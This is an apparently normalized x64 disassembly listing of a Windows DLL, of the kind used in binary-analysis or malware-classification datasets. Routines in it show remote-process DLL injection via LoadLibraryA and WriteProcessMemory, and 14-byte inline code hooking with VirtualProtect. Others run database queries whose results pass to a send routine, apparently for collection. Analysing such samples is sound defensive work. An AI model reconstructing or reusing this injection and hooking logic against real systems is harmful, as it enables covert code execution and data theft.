cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test rax rax
je r-xdata
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_1000df20
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rdi
mov rdi rcx
mov ebx edx
call sub_1000d920
test bl 0x1
mov rbx [ rsp + 0x40 ]
je r-xdata
mov rax rdi
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
mov rcx rdi
call ??3@YAXPEAX@Z
sub_1000df60
mov r11 rsp
sub rsp 0x6b8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x660 ] rax
mov [ r11 - 0x8 ] rbx
mov rbx [ rsp + 0x6f8 ]
mov [ r11 - 0x10 ] rbp
mov [ r11 - 0x18 ] rsi
mov [ r11 - 0x20 ] rdi
mov [ r11 - 0x28 ] r12
mov r12 [ rsp + 0x6e8 ]
mov [ r11 - 0x30 ] r13
mov r13 [ rsp + 0x6f0 ]
mov [ r11 - 0x38 ] r14
mov rdi rcx
mov [ r11 - 0x40 ] r15
mov r15 [ rsp + 0x700 ]
mov ecx 0x100000
mov r14d r9d
mov ebp r8d
mov rsi rdx
call ??2@YAPEAX_K@Z
test rax rax
mov [ rdi + 0x10 ] rax
je r-xdata
mov eax 0xffffffff
jmp r-xdata
test r14d r14d
jne r-xdata
mov r15 [ rsp + 0x678 ]
mov r14 [ rsp + 0x680 ]
mov r13 [ rsp + 0x688 ]
mov r12 [ rsp + 0x690 ]
mov rdi [ rsp + 0x698 ]
mov rsi [ rsp + 0x6a0 ]
mov rbp [ rsp + 0x6a8 ]
mov rbx [ rsp + 0x6b0 ]
mov rcx [ rsp + 0x660 ]
xor rcx rsp
call sub_10010a60
add rsp 0x6b8
retn
xor r14d r14d
cmp [ rsp + 0x6e0 ] r14d
mov [ r15 ] r14d
je r-xdata
mov rcx rdi
call sub_1000dd20
test eax eax
jne r-xdata
lea r8 [ r--data ]
lea rcx [ rsp + 0x460 ]
mov r9 rsi
mov edx 0x200
mov [ rsp + 0x20 ] ebp
call [ _snprintf@IAT ]
mov [ rsp + 0x30 ] r13
lea r8 [ r--data ]
lea rcx [ rsp + 0x460 ]
mov r9 rsi
mov edx 0x200
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] ebp
call [ _snprintf@IAT ]
jmp r-xdata
mov [ rsp + 0x30 ] r15
mov r9 r12
mov r8d ebp
mov rdx rsi
mov rcx rdi
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] r13
call sub_1000d990
jmp r-xdata
mov rax [ r--data ]
mov rcx 0xffffffffffffffff
mov rdi rbx
mov [ rbx ] rax
mov rax [ r--data ]
mov [ rbx + 0x8 ] rax
mov rax [ r--data ]
mov [ rbx + 0x10 ] rax
mov rax [ r--data ]
mov [ rbx + 0x18 ] rax
mov eax [ r--data ]
mov [ rbx + 0x20 ] eax
movzx eax [ r--data ]
mov [ rbx + 0x24 ] ax
xor eax eax
[ rdi ]
not rcx
sub rcx 0x1
mov [ r15 ] ecx
mov rcx [ rsi ]
xor r9d r9d
mov edx 0xc8
lea r8d [ r9 + 0x3 ]
call [ rw-data ]
cmp ax 0xffff
jne r-xdata
lea rsi [ rdi + 0x28 ]
xor edx edx
mov cx 0x1
mov r8 rsi
call [ rw-data ]
cmp ax 0xffff
je r-xdata
mov rdx [ rsi ]
lea rbp [ rdi + 0x30 ]
mov cx 0x2
mov r8 rbp
call [ rw-data ]
cmp ax 0xffff
je r-xdata
mov rdx [ rsi ]
mov cx 0x1
call [ rw-data ]
mov [ rsi ] r14
mov eax 0xffffffff
jmp r-xdata
xor eax eax
lea rdi [ rsp + 0x460 ]
mov rcx 0xffffffffffffffff
mov [ rsp + 0x38 ] ax
[ rdi ]
mov [ rsp + 0x30 ] r14
not rcx
lea r8 [ rsp + 0x460 ]
xor edx edx
lea r9 [ rcx - 0x1 ]
mov rcx [ rbp ]
mov [ rsp + 0x28 ] 0xff
mov [ rsp + 0x20 ] r14
call [ rw-data ]
cmp ax 0xffff
jne r-xdata
mov rdx [ rbp ]
lea rax [ rsp + 0x40 ]
mov esi 0x1
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x50 ]
movzx r8d si
mov cx 0x2
mov [ rsp + 0x48 ] r14d
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x40 ] r14w
mov [ rsp + 0x60 ] r14b
call [ rw-data ]
test ax ax
jne r-xdata
mov rdx [ rbp ]
lea rax [ rsp + 0x44 ]
lea r9 [ rsp + 0x58 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0x260 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x50 ]
mov r8w 0x1
mov cx 0x2
mov [ rsp + 0x50 ] r14d
mov [ rsp + 0x44 ] r14w
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x260 ] r14b
call [ rw-data ]
lea rax [ rsp + 0x260 ]
lea rdx [ rsp + 0x260 ]
sub rbx rax
nop
nop
nop
xor eax eax
nop
nop
nop
nop
movzx eax [ rdx ]
add rdx 0x1
test al al
mov [ rbx + rdx - 0x1 ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x260 ]
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
mov [ r15 ] ecx
mov rdx [ rbp ]
mov cx 0x2
call [ rw-data ]
mov rdx [ rsi ]
mov cx 0x1
call [ rw-data ]
mov [ rsi ] r14
mov [ rbp ] r14
mov eax 0xffffffff
jmp r-xdata
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x60 ]
mov rcx 0xffffffffffffffff
[ rdi ]
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x60 ] al
not rcx
lea rax [ rsp + 0x40 ]
add esi 0x1
add [ r15 ] ecx
mov rdx [ rbp ]
mov [ rsp + 0x38 ] rax
movsxd rcx ecx
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x48 ]
add rbx rcx
lea r9 [ rsp + 0x50 ]
mov cx 0x2
movzx r8d si
mov [ rsp + 0x48 ] r14d
mov [ rsp + 0x20 ] rax
call [ rw-data ]
test ax ax
je r-xdata
lea rax [ rsp + 0x60 ]
mov rdx rbx
lea rcx [ rsp + 0x60 ]
sub rdx rax
sub_1000e3b0
mov r11 rsp
sub rsp 0x328
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2e0 ] rax
mov [ r11 + 0x18 ] rbx
mov [ r11 - 0x8 ] rsi
mov [ r11 - 0x20 ] r13
xor esi esi
mov rbx rdx
mov rdx [ rcx + 0x30 ]
mov r13 rcx
lea r8 [ rsp + 0x60 ]
mov cx 0x3
mov [ r11 - 0x28 ] r14
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] esi
mov [ rsp + 0x50 ] si
call [ rw-data ]
cmp ax 0xffff
je r-xdata
mov eax 0xffffffff
jmp r-xdata
cmp ax 0xfffe
je r-xdata
mov r14 [ rsp + 0x300 ]
mov r13 [ rsp + 0x308 ]
mov rsi [ rsp + 0x320 ]
mov rbx [ rsp + 0x340 ]
mov rcx [ rsp + 0x2e0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x328
retn
mov [ rsp + 0x318 ] rdi
xor eax eax
mov r14 0xffffffffffffffff
mov rdi rbx
mov rcx r14
mov rdx rbx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx [ rsp + 0x60 ]
call [ rw-data ]
cmp ax r14w
jne r-xdata
mov [ rsp + 0x348 ] rbp
mov eax 0x1
mov [ rsp + 0x310 ] r12
mov [ rsp + 0x2f8 ] r15
mov ebx 0x10000
mov [ rsp + 0x7c ] eax
jmp r-xdata
mov rdx [ rsp + 0x60 ]
lea rax [ rsp + 0x50 ]
lea r9 [ rsp + 0x98 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0xe0 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x58 ]
mov r8w 0x1
mov cx 0x3
mov [ rsp + 0xe0 ] sil
mov [ rsp + 0x20 ] rax
call [ rw-data ]
lea rdx [ rsp + 0xe0 ]
mov rcx r13
call sub_1000dcd0
mov rdx [ rsp + 0x60 ]
mov cx 0x3
call [ rw-data ]
mov eax r14d
mov rdx [ rsp + 0x60 ]
mov edi eax
mov [ rsp + 0x78 ] eax
lea rax [ rsp + 0x50 ]
lea r9 [ rsp + 0x98 ]
mov r8w 0x1
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0xe0 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x58 ]
mov cx 0x3
mov [ rsp + 0x58 ] esi
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0xe0 ] 0x0
mov [ rsp + 0x20 ] rax
call [ rw-data ]
test ax ax
jne r-xdata
mov rcx [ rsp + 0x60 ]
lea rdx [ rsp + 0x54 ]
mov [ rsp + 0x54 ] 0x0
call [ rw-data ]
mov rcx [ rsp + 0x60 ]
lea rdx [ rsp + 0x88 ]
mov [ rsp + 0x88 ] rsi
call [ rw-data ]
movzx eax [ rsp + 0x54 ]
test ax ax
mov r15 rsi
jle r-xdata
nop
nop
nop
mov rbp [ r13 + 0x10 ]
cwde
mov r12w 0x1
mov [ rbp ] eax
movzx eax [ rsp + 0x54 ]
add rbp 0x4
cmp ax r12w
jl r-xdata
cwde
add eax 0x1
movsxd rcx eax
mov eax 0x4
mul rcx
cmovo rax r14
mov rcx rax
call ??2@YAPEAX_K@Z
mov edi esi
mov r15 rax
mov ax [ rsp + 0x54 ]
test ax ax
js r-xdata
lea rdx [ rsp + 0xe0 ]
mov rcx r13
call sub_1000dcd0
mov rdx [ rsp + 0x60 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0xe0 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x58 ]
add edi 0x1
lea r9 [ rsp + 0x98 ]
mov cx 0x3
movzx r8d di
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x58 ] esi
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0xe0 ] 0x0
call [ rw-data ]
test ax ax
je r-xdata
mov [ rsp + 0x78 ] edi
test ax ax
jle r-xdata
jmp r-xdata
mov rdx r15
nop
mov rax rbp
sub rax [ r13 + 0x10 ]
cmp rax 0x4
jbe r-xdata
nop
nop
mov rcx [ rsp + 0x60 ]
lea rax [ rsp + 0x74 ]
lea r8 [ rsp + 0xa0 ]
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x68 ]
mov r9w 0x40
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0x80 ]
movzx edx r12w
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x6c ]
mov [ rsp + 0xa0 ] 0x0
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x70 ] 0x0
mov [ rsp + 0x6c ] 0x0
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x68 ] 0x0
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x74 ] 0x0
call [ rw-data ]
mov rdx [ rsp + 0x80 ]
cmp rdx rbx
cmova rdx rbx
cmp ax r14w
mov [ rsp + 0x80 ] rdx
je r-xdata
mov [ rdx ] esi
movsx eax [ rsp + 0x54 ]
add edi 0x1
add rdx 0x4
cmp edi eax
jle r-xdata
test r15 r15
je r-xdata
sub ebp [ r13 + 0x10 ]
mov r9 [ r13 + 0x10 ]
mov rcx [ r13 + 0x8 ]
mov r8d ebp
mov edx 0xa01d
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] ebp
call sub_10004e70
movzx r8d [ rsp + 0x78 ]
mov rdx [ rsp + 0x60 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0xe0 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x98 ]
mov cx 0x3
mov [ rsp + 0x58 ] 0x0
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x20 ] rax
mov [ rsp + 0xe0 ] 0x0
call [ rw-data ]
lea rdx [ rsp + 0xe0 ]
mov rcx r13
call sub_1000dcd0
cmp ax 0x64
je r-xdata
mov ax [ rsp + 0x54 ]
cmp edx 0x1
jg r-xdata
mov rcx [ rsp + 0x60 ]
call [ rw-data ]
mov ebx 0x10000
test ax ax
mov eax 0x1
je r-xdata
mov eax [ r15 ]
mov rdi r15
test rax rax
je r-xdata
movzx ecx [ rsp + 0x54 ]
xor r10d r10d
test cx cx
jle r-xdata
cmp edx 0x64
mov eax 0x64
cmovg edx eax
mov edx 0xa
jmp r-xdata
xor esi esi
mov rdx [ rsp + 0x60 ]
xor edi edi
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x38 ] rax
lea rax [ rsp + 0xe0 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x98 ]
mov r8w 0x1
mov cx 0x3
mov [ rsp + 0x58 ] edi
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x50 ] di
mov [ rsp + 0xe0 ] dil
call [ rw-data ]
mov r15 [ rsp + 0x2f8 ]
mov r12 [ rsp + 0x310 ]
test ax ax
mov rbp [ rsp + 0x348 ]
jne r-xdata
mov rcx r15
call ??3@YAXPEAX@Z
mov rcx rax
call ??3@YAXPEAX@Z
mov eax [ rdi + 0x4 ]
add rdi 0x4
test rax rax
jne r-xdata
test cx cx
jg r-xdata
mov r9 r15
nop
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x1 ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0xa0 ]
mov rcx r14
[ rdi ]
movsx eax [ rsp + 0x6c ]
not rcx
add rbp rcx
add rbp 0xc
mov [ rbp - 0xc ] eax
mov [ rbp - 0x8 ] edx
movsx eax [ rsp + 0x68 ]
mov [ rbp - 0x4 ] eax
mov esi [ rsp + 0x80 ]
add esi 0x10
mov ecx esi
call ??2@YAPEAX_K@Z
movsx rcx r12w
mov r8d esi
mov [ r15 + rcx * 4 - 0x4 ] eax
mov rcx rax
xor edx edx
mov rbx rax
call memset
mov rcx [ rsp + 0x60 ]
lea rax [ rsp + 0x90 ]
mov r9 rbx
mov r8w 0x1
mov [ rsp + 0x28 ] rax
movzx edx r12w
mov [ rsp + 0x90 ] 0x0
mov [ rsp + 0x20 ] esi
call [ rw-data ]
cmp ax r14w
je r-xdata
lea rax [ rsp + 0xa0 ]
mov rdi rbp
lea rcx [ rsp + 0xa0 ]
sub rdi rax
mov rdx [ rsp + 0x60 ]
mov cx 0x3
call [ rw-data ]
xor eax eax
jmp r-xdata
nop
nop
nop
mov rcx [ rsp + 0x60 ]
call [ rw-data ]
cmp ax r14w
je r-xdata
jmp r-xdata
mov [ r8 ] 0x0
movsx ecx [ rsp + 0x54 ]
add r10d 0x1
add r9 0x4
cmp r10d ecx
jl r-xdata
mov rdx rbp
mov rcx r8
sub rdx r8
nop
nop
mov ax [ rsp + 0x54 ]
add r12w 0x1
mov ebx 0x10000
cmp r12w ax
jle r-xdata
mov rdi [ rsp + 0x318 ]
lea rdx [ rsp + 0xe0 ]
mov rcx r13
call sub_1000dcd0
mov eax [ rsp + 0x7c ]
mov rdx [ rsp + 0x60 ]
add eax 0x1
lea rcx [ rsp + 0x50 ]
lea r9 [ rsp + 0x98 ]
mov [ rsp + 0x38 ] rcx
lea rcx [ rsp + 0xe0 ]
mov [ rsp + 0x30 ] 0x200
mov [ rsp + 0x28 ] rcx
lea rcx [ rsp + 0x58 ]
movzx r8d ax
mov [ rsp + 0x20 ] rcx
mov cx 0x3
mov [ rsp + 0x7c ] eax
mov [ rsp + 0x58 ] edi
mov [ rsp + 0x50 ] di
mov [ rsp + 0xe0 ] dil
call [ rw-data ]
test ax ax
je r-xdata
mov r8d [ r9 ]
mov rax rbp
sub rax [ r13 + 0x10 ]
cmp rax 0xff000
jge r-xdata
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
xor eax eax
mov rcx r14
mov rdi r8
[ rdi ]
not rcx
sub rcx 0x1
lea rbp [ rcx + rbp + 0x1 ]
xor esi esi
jmp r-xdata
sub_1000eaf0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
call [ rw-data ]
test eax eax
jne r-xdata
mov rcx [ rbx + 0x18 ]
call [ rw-data ]
test rax rax
je r-xdata
nop
nop
nop
mov eax 0xffffffff
add rsp 0x20
pop rbx
retn
mov rdx rax
mov rcx rbx
call sub_1000dcd0
mov rcx [ rbx + 0x18 ]
call [ rw-data ]
test eax eax
jne r-xdata
mov rdx rax
mov rcx rbx
call sub_1000db00
jmp r-xdata
mov rcx [ rbx + 0x18 ]
call [ rw-data ]
test eax eax
je r-xdata
mov rcx [ rbx + 0x18 ]
call [ rw-data ]
test rax rax
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
sub_1000eb80
mov rax rsp
sub rsp 0x88
test edx edx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rdi
movsxd rdi edx
mov rbp rcx
jg r-xdata
mov rcx rdi
mov [ rsp + 0x90 ] rbx
mov [ rsp + 0xa0 ] rsi
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rax
call memset
mov rcx [ rbp + 0x8 ]
mov r8d edi
mov rdx rbx
call sub_10004db0
cmp eax edi
je r-xdata
mov rdi [ rsp + 0xa8 ]
mov rbp [ rsp + 0x98 ]
add rsp 0x88
retn
mov rbx [ rsp + 0x90 ]
mov rsi [ rsp + 0xa0 ]
xor eax eax
mov [ rsp + 0x80 ] r12
mov [ rsp + 0x78 ] r13
xor esi esi
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
mov [ rsp + 0x70 ] r14
mov [ rsp + 0x68 ] r15
not rcx
mov r14 rsi
mov r15 rsi
mov eax [ rcx + rbx ]
lea rdx [ rcx + rbx ]
mov [ rsp + 0x54 ] eax
movzx eax [ rdx + 0x4 ]
mov r12d eax
mov r13d eax
shr r12d 0x4
and r13d 0x1
mov [ rbp + 0x20 ] r12d
jne r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
lea rdi [ rdx + 0x5 ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
lea r14 [ rdx + 0x5 ]
not rcx
lea r15 [ rcx + rdx + 0x5 ]
test r12d r12d
jne r-xdata
xor edx edx
mov r8d 0x10000
mov rcx rax
call memset
mov r8d [ rsp + 0x54 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] rcx
lea rax [ rdi + 0x1 ]
mov r9d r12d
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r15
mov rdx rbx
mov rcx rbp
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x50 ] esi
mov [ rsp + 0x20 ] r13d
call sub_1000df60
mov ecx [ rsp + 0x50 ]
add ecx 0x3
mov [ rdi ] al
mov [ rsp + 0x28 ] si
mov [ rsp + 0x20 ] ecx
mov rcx [ rbp + 0x8 ]
mov r9 rdi
mov edx 0xa01a
mov r8d 0x10000
mov r12d eax
call sub_10004e70
mov rcx rbx
call ??3@YAXPEAX@Z
mov rcx rdi
call ??3@YAXPEAX@Z
mov rcx [ rbp + 0x8 ]
call sub_10004a20
test eax eax
jne r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
mov ecx 0x10000
call ??2@YAPEAX_K@Z
test rax rax
mov rdi rax
jne r-xdata
xor eax eax
mov rcx [ rbp + 0x8 ]
cmp [ rcx + 0x28 ] esi
jne r-xdata
test r12d r12d
sete sil
mov eax esi
jmp r-xdata
mov r14 [ rsp + 0x70 ]
mov r13 [ rsp + 0x78 ]
mov r12 [ rsp + 0x80 ]
mov r15 [ rsp + 0x68 ]
sub_1000ed80
sub rsp 0x28
test edx edx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
mov rdi rcx
mov esi edx
jle r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x28
retn
lea eax [ rdx + 0x2 ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
movsxd rbp eax
mov rcx rbp
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov r8 rbp
xor edx edx
mov rcx rax
call memset
mov rcx [ rdi + 0x8 ]
mov r8d esi
mov rdx rbx
call sub_10004db0
cmp eax esi
jne r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
cmp [ rdi + 0x20 ] 0x0
je r-xdata
mov rdx rbx
mov rcx rdi
call sub_1000eaf0
mov rdx rbx
mov rcx rdi
call sub_1000e3b0
jmp r-xdata
sub_1000ee20
lea rax [ rw-data ]
lea r8 [ rw-data ]
nop
add rax 0x2
cmp rax r8
jl r-xdata
cmp dx cx
je r-xdata
movzx edx [ rax ]
test dx dx
je r-xdata
xor eax eax
retn
mov eax 0x1
retn
sub_1000ee50
push rbx
sub rsp 0x2c0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2b0 ] rax
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_10001000
lea rcx [ rsp + 0x20 ]
mov r8d 0x80
mov rdx rbx
call sub_100017a0
lea rcx [ rsp + 0x20 ]
mov dl 0x40
call sub_100010b0
lea rdx [ sub_10001590 ]
lea rcx [ rsp + 0x20 ]
call sub_100010d0
xor ebx ebx
nop
nop
xor eax eax
movzx eax [ rsp + 0x88 ]
cmp al 0x6a
je r-xdata
cmp al 0x63
jne r-xdata
cmp al 0x72
jne r-xdata
cmp [ rsp + 0x89 ] 0x61
jmp r-xdata
add ebx r11d
cmp ebx 0xe
jl r-xdata
cmp [ rsp + 0x89 ] 0x65
jne r-xdata
je r-xdata
lea rcx [ rsp + 0x20 ]
call sub_10001060
test eax eax
mov r11d eax
jle r-xdata
mov eax ebx
jmp r-xdata
cmp [ rsp + 0x8a ] 0x74
mov rcx [ rsp + 0x2b0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x2c0
pop rbx
retn
sub_1000ef20
mov r11 rsp
sub rsp 0xe8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov [ r11 - 0x10 ] rbp
mov [ r11 - 0x18 ] rsi
mov [ r11 - 0x20 ] rdi
mov [ r11 - 0x28 ] r12
mov [ r11 - 0x30 ] r13
xor ebp ebp
mov [ r11 - 0x38 ] r14
movsxd r13 r9d
mov r12 r8
mov rdi rcx
mov esi ebp
mov r14 rdx
nop
nop
nop
cmp esi 0x1f4
jl r-xdata
add esi 0x1
add rdi 0x1
cmp esi 0x1f4
jl r-xdata
lea rcx [ rsp + 0x20 ]
mov r8 r13
mov rdx r12
mov [ rsp + 0xe0 ] rbx
call memcpy
mov edx [ r--data ]
mov [ rsp + r13 + 0x20 ] edx
movzx edx [ r--data ]
mov rcx rdi
mov [ rsp + r13 + 0x24 ] dx
lea rdx [ r13 + r12 ]
mov [ rbp ] r14
mov [ rsp + r13 + 0x26 ] rdx
lea edx [ r13 + 0xe ]
movsxd r8 edx
lea rdx [ rsp + 0x20 ]
call memcpy
mov rbx [ rsp + 0xe0 ]
mov eax esi
mov eax 0xffffffff
jmp r-xdata
mov eax [ rdi ]
cmp eax 0x11223344
cmove rbp rdi
cmp eax 0xaabbccdd
je r-xdata
mov eax 0xffffffff
jmp r-xdata
mov r14 [ rsp + 0xb0 ]
mov r13 [ rsp + 0xb8 ]
mov r12 [ rsp + 0xc0 ]
mov rdi [ rsp + 0xc8 ]
mov rsi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xd8 ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_10010a60
add rsp 0xe8
retn
sub_1000f050
mov r11 rsp
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov [ r11 + 0x20 ] rbx
mov [ r11 - 0x8 ] rbp
mov [ r11 - 0x10 ] rsi
mov [ r11 - 0x20 ] r12
mov rbp r8
mov rbx rcx
mov r12 rdx
call sub_1000ee50
test eax eax
mov esi eax
jg r-xdata
xor ecx ecx
mov edx 0x1000
mov [ rsp + 0xe0 ] rdi
lea r9d [ rcx + 0x40 ]
mov r8d edx
call [ VirtualAlloc@IAT ]
test rax rax
mov rdi rax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov rcx rax
call j_sub_1001022c
mov edx 0x90
lea rcx [ rsp + 0x40 ]
lea r8d [ rdx - 0x10 ]
call memset
mov eax [ r--data ]
lea r11 [ rsp + 0x40 ]
mov [ r11 ] eax
movzx eax [ r--data ]
mov r9d esi
mov [ r11 + 0x4 ] ax
mov r8 rbx
mov rdx r12
mov rcx rdi
mov [ rsp + 0x46 ] rdi
call sub_1000ef20
test eax eax
jg r-xdata
mov r12 [ rsp + 0xd8 ]
mov rsi [ rsp + 0xe8 ]
mov rbp [ rsp + 0xf0 ]
mov rbx [ rsp + 0x118 ]
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_10010a60
add rsp 0xf8
retn
mov rdi [ rsp + 0xe0 ]
cdqe
lea r9 [ rsp + 0x30 ]
mov rcx rbx
add rax rdi
xor edi edi
lea edx [ rdi + 0xe ]
lea r8d [ rdi + 0x40 ]
mov [ rbp ] rax
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
mov eax edi
call [ GetCurrentProcess@IAT ]
lea r9d [ rdi + 0xe ]
lea r8 [ rsp + 0x40 ]
mov rcx rax
lea rax [ rsp + 0x38 ]
mov rdx rbx
mov [ rsp + 0x20 ] rax
call [ WriteProcessMemory@IAT ]
mov r8d [ rsp + 0x30 ]
lea r9 [ rsp + 0x30 ]
mov edx 0xe
mov rcx rbx
mov edi eax
call [ VirtualProtect@IAT ]
sub_1000f1c0
mov r11 rsp
sub rsp 0x1c8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x180 ] rax
mov [ r11 - 0x8 ] rbx
xor eax eax
mov [ r11 - 0x10 ] rbp
mov [ r11 - 0x20 ] rdi
mov [ r11 - 0x28 ] r12
xor ebx ebx
mov [ r11 - 0x30 ] r13
mov r13 rdx
mov rdx [ LoadLibraryA@IAT ]
movsxd rbp r9d
mov rdi r8
lea r9d [ rbx + 0x30 ]
lea r8 [ rsp + 0x38 ]
mov r12 rcx
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
call [ VirtualQueryEx@IAT ]
cmp [ rsp + 0x38 ] rbx
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rsp + 0x50 ] rbx
je r-xdata
mov r13 [ rsp + 0x198 ]
mov r12 [ rsp + 0x1a0 ]
mov rdi [ rsp + 0x1a8 ]
mov rbp [ rsp + 0x1b8 ]
mov rbx [ rsp + 0x1c0 ]
mov rcx [ rsp + 0x180 ]
xor rcx rsp
call sub_10010a60
add rsp 0x1c8
retn
mov rcx [ rw-data ]
lea rdx [ rsp + 0x70 ]
mov r8d 0x104
mov [ rsp + 0x1b0 ] rsi
call [ GetModuleFileNameA@IAT ]
lea rax [ rsp + 0x30 ]
lea rsi [ r13 + 0x800 ]
lea r8 [ rsp + 0x70 ]
mov r9d 0x104
mov rcx r12
mov rdx rsi
mov [ rsp + 0x20 ] rax
call [ WriteProcessMemory@IAT ]
test eax eax
jne r-xdata
test ebp ebp
mov r9 rbp
jle r-xdata
mov rsi [ rsp + 0x1b0 ]
mov rax [ rsp + 0x1f0 ]
mov r8 rdi
mov rdx r13
mov [ rbp + rdi - 0x8 ] rax
lea rax [ rsp + 0x30 ]
mov rcx r12
mov [ rsp + 0x20 ] rax
call [ WriteProcessMemory@IAT ]
jmp r-xdata
mov rcx 0x1122334455667788
mov rdx 0x1234567887654321
nop
nop
cmp rax rdx
jne r-xdata
mov [ rbx + rdi ] rsi
jmp r-xdata
add rbx 0x1
cmp rbx rbp
jl r-xdata
mov rax [ LoadLibraryA@IAT ]
mov [ rbx + rdi ] rax
mov rax [ rbx + rdi ]
cmp rax rcx
jne r-xdata
sub_1000f360
mov r11 rsp
sub rsp 0x628
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x600 ] rax
mov [ r11 + 0x20 ] rbx
mov [ r11 - 0x8 ] rbp
mov rbp rcx
mov [ r11 - 0x10 ] rsi
mov rbx rdx
mov esi r8d
lea rcx [ rsp + 0x38 ]
xor edx edx
mov r8d 0x4c8
